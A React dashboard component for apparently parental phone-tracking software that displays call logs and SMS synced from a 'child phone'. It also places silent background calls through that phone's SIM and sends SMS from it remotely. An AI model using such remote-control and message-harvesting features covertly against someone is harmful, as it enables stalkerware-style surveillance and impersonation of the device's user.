import React, { useState } from 'react';
import {
  PhoneCall,
  PhoneIncoming,
  PhoneOutgoing,
  PhoneMissed,
  MessageSquare,
  Send,
  RefreshCw,
  Clock,
  User,
  Hash,
  ArrowRight,
  ShieldAlert,
  CheckCircle2,
  Phone,
  PhoneForwarded,
  Maximize2,
  Delete,
  X
} from 'lucide-react';
import {
  triggerSyncCallLogs,
  triggerSyncSms,
  triggerSendSms,
  triggerDirectCall,
  triggerRemoteDial
} from '../services/trackerService';
import DraggableWindow from './DraggableWindow';

export default function CallSmsExplorer({
  deviceId,
  callLogs = [],
  smsLogs = []
}) {
  const [activeTab, setActiveTab] = useState('CALLS'); // 'CALLS', 'SMS', 'DIALER', 'SEND_SMS'
  const [targetNumber, setTargetNumber] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [syncingCalls, setSyncingCalls] = useState(false);
  const [syncingSms, setSyncingSms] = useState(false);
  const [sendingSms, setSendingSms] = useState(false);
  const [dialingAction, setDialingAction] = useState(false);
  const [statusMsg, setStatusMsg] = useState('');

  // Draggable Window State
  const [selectedCall, setSelectedCall] = useState(null);
  const [selectedSms, setSelectedSms] = useState(null);
  const [replyText, setReplyText] = useState('');

  const handleSyncCalls = async () => {
    try {
      setSyncingCalls(true);
      setStatusMsg('Requesting latest call logs from child phone...');
      await triggerSyncCallLogs(deviceId);
      setTimeout(() => {
        setSyncingCalls(false);
        setStatusMsg('Call logs sync dispatched!');
      }, 2500);
    } catch (e) {
      setSyncingCalls(false);
      setStatusMsg(`Sync failed: ${e.message}`);
    }
  };

  const handleSyncSms = async () => {
    try {
      setSyncingSms(true);
      setStatusMsg('Requesting latest SMS from child phone...');
      await triggerSyncSms(deviceId);
      setTimeout(() => {
        setSyncingSms(false);
        setStatusMsg('SMS sync dispatched!');
      }, 2500);
    } catch (e) {
      setSyncingSms(false);
      setStatusMsg(`Sync failed: ${e.message}`);
    }
  };

  const handleSendSms = async (destination, body) => {
    const dest = destination || targetNumber;
    const msg = body || smsBody;
    if (!dest.trim() || !msg.trim()) return;

    try {
      setSendingSms(true);
      setStatusMsg(`Sending SMS to ${dest.trim()} via child phone cellular radio...`);
      await triggerSendSms(deviceId, dest.trim(), msg.trim());
      setSmsBody('');
      setReplyText('');
      setStatusMsg('✅ SMS dispatched successfully through companion device!');
      setTimeout(() => {
        setSendingSms(false);
        setStatusMsg('');
      }, 4000);
    } catch (e) {
      setSendingSms(false);
      setStatusMsg(`Failed to send SMS: ${e.message}`);
    }
  };

  const handleDirectCall = async (number) => {
    const num = number || targetNumber;
    if (!num.trim()) return;
    try {
      setDialingAction(true);
      setStatusMsg(`📞 Initiating background direct call (ACTION_CALL) to ${num.trim()}...`);
      await triggerDirectCall(deviceId, num.trim());
      setTimeout(() => {
        setDialingAction(false);
        setStatusMsg(`Call dispatched for ${num.trim()}!`);
      }, 4000);
    } catch (e) {
      setDialingAction(false);
      setStatusMsg(`Call error: ${e.message}`);
    }
  };

  const handleRemoteDialer = async (number) => {
    const num = number || targetNumber;
    if (!num.trim()) return;
    try {
      setDialingAction(true);
      setStatusMsg(`📱 Opening dialer (ACTION_DIAL) on child phone with number ${num.trim()}...`);
      await triggerRemoteDial(deviceId, num.trim(), false);
      setTimeout(() => {
        setDialingAction(false);
        setStatusMsg(`Dialer opened with ${num.trim()}!`);
      }, 4000);
    } catch (e) {
      setDialingAction(false);
      setStatusMsg(`Dialer error: ${e.message}`);
    }
  };

  const formatTimestamp = (ts) => {
    if (!ts) return 'Unknown';
    return new Date(ts).toLocaleString([], {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const getCallTypeBadge = (type) => {
    switch (type) {
      case 'INCOMING':
        return (
          <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-emerald-950/80 text-emerald-400 border border-emerald-800/60">
            <PhoneIncoming className="w-3 h-3" />
            <span>Incoming</span>
          </span>
        );
      case 'OUTGOING':
        return (
          <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-blue-950/80 text-blue-400 border border-blue-800/60">
            <PhoneOutgoing className="w-3 h-3" />
            <span>Outgoing</span>
          </span>
        );
      case 'MISSED':
        return (
          <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-rose-950/80 text-rose-400 border border-rose-800/60">
            <PhoneMissed className="w-3 h-3" />
            <span>Missed</span>
          </span>
        );
      default:
        return (
          <span className="inline-flex items-center space-x-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-slate-800 text-slate-300">
            <span>{type}</span>
          </span>
        );
    }
  };

  const handleKeypadPress = (val) => {
    setTargetNumber(prev => prev + val);
  };

  const handleKeypadBackspace = () => {
    setTargetNumber(prev => prev.slice(0, -1));
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-xl space-y-4 sm:space-y-6">
      {/* Top Header & Quick Sync Actions */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 border-b border-slate-800 gap-3">
        <div className="flex items-center space-x-2.5">
          <div className="p-2.5 rounded-xl bg-emerald-950/60 border border-emerald-800/40 text-emerald-400 shrink-0">
            <PhoneCall className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
              <span>Calls, SMS & Remote Dialer Hub</span>
              <span className="text-[10px] font-mono bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800/40">
                Live Companion
              </span>
            </h2>
            <p className="text-[11px] sm:text-xs text-slate-400">
              Inspect call logs, SMS threads in draggable windows, and control phone dialer remotely
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <button
            onClick={handleSyncCalls}
            disabled={syncingCalls}
            className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-colors disabled:opacity-50"
            title="Sync Call Logs"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${syncingCalls ? 'animate-spin text-emerald-400' : ''}`} />
            <span>Sync Calls</span>
          </button>

          <button
            onClick={handleSyncSms}
            disabled={syncingSms}
            className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-colors disabled:opacity-50"
            title="Sync SMS Messages"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${syncingSms ? 'animate-spin text-cyan-400' : ''}`} />
            <span>Sync SMS</span>
          </button>
        </div>
      </div>

      {/* Tabs Switcher */}
      <div className="flex items-center space-x-2 border-b border-slate-800/80 pb-2 overflow-x-auto scrollbar-none">
        <button
          onClick={() => setActiveTab('CALLS')}
          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all whitespace-nowrap ${
            activeTab === 'CALLS'
              ? 'bg-emerald-500 text-black font-bold shadow-md shadow-emerald-950/50'
              : 'text-slate-400 hover:text-white bg-slate-950/60 border border-slate-800'
          }`}
        >
          <PhoneIncoming className="w-3.5 h-3.5" />
          <span>Call Logs ({callLogs.length})</span>
        </button>

        <button
          onClick={() => setActiveTab('SMS')}
          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all whitespace-nowrap ${
            activeTab === 'SMS'
              ? 'bg-cyan-500 text-black font-bold shadow-md shadow-cyan-950/50'
              : 'text-slate-400 hover:text-white bg-slate-950/60 border border-slate-800'
          }`}
        >
          <MessageSquare className="w-3.5 h-3.5" />
          <span>SMS Messages ({smsLogs.length})</span>
        </button>

        {/* Remote Phone Dialer (Shifted here from Live Chat tab) */}
        <button
          onClick={() => setActiveTab('DIALER')}
          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all whitespace-nowrap ${
            activeTab === 'DIALER'
              ? 'bg-amber-500 text-black font-bold shadow-md shadow-amber-950/50'
              : 'text-slate-400 hover:text-white bg-slate-950/60 border border-slate-800'
          }`}
        >
          <PhoneCall className="w-3.5 h-3.5" />
          <span>Remote Phone Dialer</span>
        </button>

        <button
          onClick={() => setActiveTab('SEND_SMS')}
          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-xl text-xs font-semibold transition-all whitespace-nowrap ${
            activeTab === 'SEND_SMS'
              ? 'bg-purple-600 text-white font-bold shadow-md shadow-purple-950/50'
              : 'text-slate-400 hover:text-white bg-slate-950/60 border border-slate-800'
          }`}
        >
          <Send className="w-3.5 h-3.5" />
          <span>Send Remote SMS</span>
        </button>
      </div>

      {/* Status Bar */}
      {statusMsg && (
        <div className="text-xs px-3.5 py-2 rounded-xl bg-slate-800/90 border border-emerald-500/40 text-emerald-300 flex items-center justify-between">
          <span>{statusMsg}</span>
          <button onClick={() => setStatusMsg('')} className="text-slate-400 hover:text-white">✕</button>
        </div>
      )}

      {/* TAB 1: CALL LOGS */}
      {activeTab === 'CALLS' && (
        <div className="space-y-2">
          {callLogs.length === 0 ? (
            <div className="text-center py-12 bg-slate-950/40 rounded-xl border border-slate-800/80 text-xs text-slate-500">
              No call logs synchronized yet. Tap "Sync Calls" or click "Sync Everything" in mobile app.
            </div>
          ) : (
            <div className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-950/50">
              <table className="w-full text-left text-xs text-slate-300">
                <thead className="bg-slate-900/90 text-slate-400 border-b border-slate-800 font-semibold uppercase text-[10px]">
                  <tr>
                    <th className="px-4 py-2.5">Caller / Contact</th>
                    <th className="px-4 py-2.5">Type</th>
                    <th className="px-4 py-2.5">Duration</th>
                    <th className="px-4 py-2.5">Time</th>
                    <th className="px-4 py-2.5 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 font-mono">
                  {callLogs.map((item) => (
                    <tr
                      key={item.id}
                      onClick={() => setSelectedCall(item)}
                      className="hover:bg-slate-800/50 transition-colors cursor-pointer group"
                      title="Click to inspect in Draggable Window"
                    >
                      <td className="px-4 py-2.5">
                        <div className="font-semibold text-white font-sans group-hover:text-cyan-300 transition-colors flex items-center space-x-1.5">
                          <span>{item.name || 'Unknown'}</span>
                          <span className="text-[10px] text-slate-500 opacity-0 group-hover:opacity-100 font-mono">🔍 Drag Window</span>
                        </div>
                        <div className="text-slate-400 text-[11px]">{item.number}</div>
                      </td>
                      <td className="px-4 py-2.5">{getCallTypeBadge(item.type)}</td>
                      <td className="px-4 py-2.5 text-slate-300 font-sans">{item.durationFormatted || `${item.durationSeconds || 0}s`}</td>
                      <td className="px-4 py-2.5 text-slate-400 text-[11px] font-sans">{formatTimestamp(item.timestamp)}</td>
                      <td className="px-4 py-2.5 text-right space-x-1.5">
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            setSelectedCall(item);
                          }}
                          className="px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 font-semibold text-[11px] border border-slate-700"
                        >
                          Inspect
                        </button>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            handleDirectCall(item.number);
                          }}
                          disabled={dialingAction}
                          className="px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-[11px] transition-all inline-flex items-center space-x-1"
                        >
                          <Phone className="w-3 h-3" />
                          <span>Call</span>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: SMS LOGS */}
      {activeTab === 'SMS' && (
        <div className="space-y-2">
          {smsLogs.length === 0 ? (
            <div className="text-center py-12 bg-slate-950/40 rounded-xl border border-slate-800/80 text-xs text-slate-500">
              No SMS messages synchronized yet. Tap "Sync SMS" or click "Sync Everything" in mobile app.
            </div>
          ) : (
            <div className="space-y-2">
              {smsLogs.map((item) => {
                const isSent = item.type === 'SENT';
                return (
                  <div
                    key={item.id}
                    onClick={() => setSelectedSms(item)}
                    className="p-3 sm:p-4 rounded-xl bg-slate-950/60 hover:bg-slate-950 border border-slate-800/80 hover:border-slate-700 transition-all cursor-pointer group"
                    title="Click to inspect in Draggable Window"
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center space-x-2">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          isSent ? 'bg-cyan-950 text-cyan-400 border border-cyan-800/50' : 'bg-emerald-950 text-emerald-400 border border-emerald-800/50'
                        }`}>
                          {isSent ? 'OUTGOING' : 'INCOMING'}
                        </span>
                        <span className="font-bold text-white font-mono text-xs">{item.address}</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <span className="text-[10px] text-slate-500 font-mono">{formatTimestamp(item.timestamp)}</span>
                        <span className="text-[10px] text-cyan-400 font-semibold opacity-0 group-hover:opacity-100 transition-opacity">
                          Inspect 🔍
                        </span>
                      </div>
                    </div>
                    <p className="text-xs text-slate-300 leading-relaxed font-sans line-clamp-2">{item.body}</p>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* TAB 3: REMOTE PHONE DIALER (Shifted from Live Chat) */}
      {activeTab === 'DIALER' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
          {/* Keypad Interface */}
          <div className="p-4 sm:p-5 rounded-2xl bg-slate-950/80 border border-slate-800 space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-slate-800">
              <span className="text-xs font-bold text-amber-400 uppercase tracking-wider flex items-center space-x-1.5">
                <PhoneCall className="w-4 h-4" />
                <span>Cellular Dialer Keypad</span>
              </span>
              <span className="text-[10px] font-mono text-slate-500">{deviceId}</span>
            </div>

            {/* Display / Input */}
            <div className="relative">
              <input
                type="tel"
                value={targetNumber}
                onChange={(e) => setTargetNumber(e.target.value)}
                placeholder="Enter number..."
                className="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-lg font-mono text-center text-white focus:outline-none focus:border-amber-500"
              />
              {targetNumber && (
                <button
                  onClick={handleKeypadBackspace}
                  className="absolute right-3 top-1/2 -translate-y-1/2 p-1.5 text-slate-400 hover:text-white"
                  title="Backspace"
                >
                  <Delete className="w-4 h-4" />
                </button>
              )}
            </div>

            {/* Numeric Keypad Grid */}
            <div className="grid grid-cols-3 gap-2">
              {['1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '0', '#'].map((key) => (
                <button
                  key={key}
                  onClick={() => handleKeypadPress(key)}
                  className="py-3 rounded-xl bg-slate-900 hover:bg-slate-800 active:bg-amber-500 active:text-black border border-slate-800 text-base font-bold text-white transition-all shadow-sm"
                >
                  {key}
                </button>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-2 gap-2 pt-2">
              <button
                onClick={() => handleDirectCall()}
                disabled={dialingAction || !targetNumber.trim()}
                className="py-3 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs flex items-center justify-center space-x-1.5 shadow-lg shadow-emerald-950/50 disabled:opacity-50 transition-all"
                title="Immediately place background call on child phone"
              >
                <Phone className="w-4 h-4" />
                <span>Direct Call</span>
              </button>

              <button
                onClick={() => handleRemoteDialer()}
                disabled={dialingAction || !targetNumber.trim()}
                className="py-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-bold text-xs flex items-center justify-center space-x-1.5 disabled:opacity-50 transition-all"
                title="Pre-fill number on child's phone dialer screen"
              >
                <PhoneForwarded className="w-4 h-4 text-amber-400" />
                <span>Open Keypad</span>
              </button>
            </div>
          </div>

          {/* Quick Contacts & Dialing Info */}
          <div className="p-4 sm:p-5 rounded-2xl bg-slate-950/60 border border-slate-800 space-y-4">
            <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider">
              Quick Contact Shortcuts
            </h4>
            <div className="space-y-2">
              {callLogs.slice(0, 5).map((log, idx) => (
                <div
                  key={log.id || idx}
                  onClick={() => setTargetNumber(log.number)}
                  className="p-2.5 rounded-xl bg-slate-900/60 hover:bg-slate-900 border border-slate-800 flex items-center justify-between text-xs cursor-pointer transition-colors"
                >
                  <div>
                    <div className="font-semibold text-white">{log.name || 'Recent Contact'}</div>
                    <div className="text-[11px] text-slate-400 font-mono">{log.number}</div>
                  </div>
                  <span className="text-[10px] text-cyan-400 font-semibold">Prefill ➔</span>
                </div>
              ))}
            </div>

            <div className="p-3 rounded-xl bg-amber-950/20 border border-amber-800/40 text-[11px] text-amber-300 space-y-1">
              <div className="font-bold">ℹ️ Remote Calling Note:</div>
              <p className="text-amber-300/80">
                <strong>Direct Call (ACTION_CALL):</strong> Routes phone call directly through child SIM card without opening manual dialogs.
              </p>
              <p className="text-amber-300/80">
                <strong>Open Keypad (ACTION_DIAL):</strong> Pre-fills the number on the device's native dialer.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: SEND REMOTE SMS */}
      {activeTab === 'SEND_SMS' && (
        <form onSubmit={(e) => { e.preventDefault(); handleSendSms(); }} className="space-y-4 max-w-lg mx-auto bg-slate-950/60 p-5 rounded-2xl border border-slate-800">
          <div>
            <label className="block text-xs font-bold text-slate-400 mb-1">Destination Phone Number</label>
            <input
              type="tel"
              value={targetNumber}
              onChange={(e) => setTargetNumber(e.target.value)}
              placeholder="+91..."
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-purple-500"
            />
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-400 mb-1">SMS Message Body</label>
            <textarea
              rows={4}
              value={smsBody}
              onChange={(e) => setSmsBody(e.target.value)}
              placeholder="Type SMS text message..."
              required
              className="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
            />
          </div>

          <button
            type="submit"
            disabled={sendingSms}
            className="w-full py-2.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs flex items-center justify-center space-x-1.5 transition-all shadow-md shadow-purple-950/50 disabled:opacity-50"
          >
            <Send className="w-3.5 h-3.5" />
            <span>{sendingSms ? 'Transmitting via Phone...' : 'Dispatch Remote SMS'}</span>
          </button>
        </form>
      )}

      {/* DRAGGABLE WINDOW 1: Call Log Inspection */}
      {selectedCall && (
        <DraggableWindow
          title="Call Log Details"
          icon={PhoneCall}
          badge={selectedCall.type}
          badgeColor="bg-emerald-950 text-emerald-300 border-emerald-800"
          isOpen={!!selectedCall}
          onClose={() => setSelectedCall(null)}
        >
          <div className="space-y-4 text-xs">
            <div className="bg-slate-950 rounded-xl p-3 border border-slate-800 space-y-2">
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-medium">Contact / Caller:</span>
                <span className="font-bold text-white text-sm">{selectedCall.name || 'Unknown Contact'}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-medium">Phone Number:</span>
                <span className="font-mono text-cyan-300 font-bold">{selectedCall.number}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-medium">Call Type:</span>
                <span>{getCallTypeBadge(selectedCall.type)}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-medium">Call Duration:</span>
                <span className="text-white font-mono">{selectedCall.durationFormatted || `${selectedCall.durationSeconds || 0}s`}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400 font-medium">Recorded Time:</span>
                <span className="text-slate-300">{formatTimestamp(selectedCall.timestamp)}</span>
              </div>
            </div>

            <div className="flex items-center space-x-2 pt-1">
              <button
                onClick={() => handleDirectCall(selectedCall.number)}
                className="flex-1 py-2 px-3 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold flex items-center justify-center space-x-1.5 transition-colors"
              >
                <Phone className="w-3.5 h-3.5" />
                <span>Direct Call</span>
              </button>
              <button
                onClick={() => {
                  setTargetNumber(selectedCall.number);
                  setActiveTab('SEND_SMS');
                  setSelectedCall(null);
                }}
                className="flex-1 py-2 px-3 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold flex items-center justify-center space-x-1.5 transition-colors"
              >
                <MessageSquare className="w-3.5 h-3.5" />
                <span>Send SMS</span>
              </button>
            </div>
          </div>
        </DraggableWindow>
      )}

      {/* DRAGGABLE WINDOW 2: SMS Conversation Inspection */}
      {selectedSms && (
        <DraggableWindow
          title="SMS Message Inspector"
          icon={MessageSquare}
          badge={selectedSms.type}
          badgeColor="bg-cyan-950 text-cyan-300 border-cyan-800"
          isOpen={!!selectedSms}
          onClose={() => setSelectedSms(null)}
        >
          <div className="space-y-4 text-xs">
            <div className="bg-slate-950 rounded-xl p-3 border border-slate-800 space-y-2">
              <div className="flex justify-between items-center">
                <span className="text-slate-400">Address / Contact:</span>
                <span className="font-mono text-cyan-300 font-bold text-sm">{selectedSms.address}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400">Direction:</span>
                <span className="font-semibold text-white">{selectedSms.type}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-slate-400">Timestamp:</span>
                <span className="text-slate-300 font-mono">{formatTimestamp(selectedSms.timestamp)}</span>
              </div>
            </div>

            <div className="p-3 bg-slate-950/80 rounded-xl border border-slate-800 space-y-1">
              <div className="text-[10px] text-slate-500 uppercase font-bold tracking-wider">Message Content:</div>
              <p className="text-slate-200 text-sm leading-relaxed whitespace-pre-wrap">{selectedSms.body}</p>
            </div>

            {/* Quick Direct Reply */}
            <div className="space-y-2 pt-1 border-t border-slate-800">
              <div className="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Quick Reply:</div>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={replyText}
                  onChange={(e) => setReplyText(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleSendSms(selectedSms.address, replyText)}
                  placeholder="Type quick reply SMS..."
                  className="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-cyan-500"
                />
                <button
                  onClick={() => handleSendSms(selectedSms.address, replyText)}
                  disabled={!replyText.trim() || sendingSms}
                  className="px-3 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-bold flex items-center space-x-1 disabled:opacity-40"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Reply</span>
                </button>
              </div>
            </div>
          </div>
        </DraggableWindow>
      )}
    </div>
  );
}
